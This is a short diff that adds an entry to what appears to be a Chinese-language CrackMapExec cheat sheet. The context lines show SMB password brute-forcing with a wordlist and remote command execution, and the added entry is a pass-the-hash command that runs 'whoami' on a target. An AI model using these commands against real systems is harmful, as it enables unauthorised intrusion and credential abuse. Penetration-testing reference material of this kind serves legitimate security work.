@@ -309,6 +309,10 @@ crackmapexec smb target_ip -x 'net user'
 
 # 12. 使用密码字典进行密码破解
 crackmapexec smb target_ip -u username -P /path/to/passwords.txt
+
+# 13. 执行命令
+crackmapexec smb target_ip -u username -H NTLM_hash -x 'whoami'
+
 ```
 
 
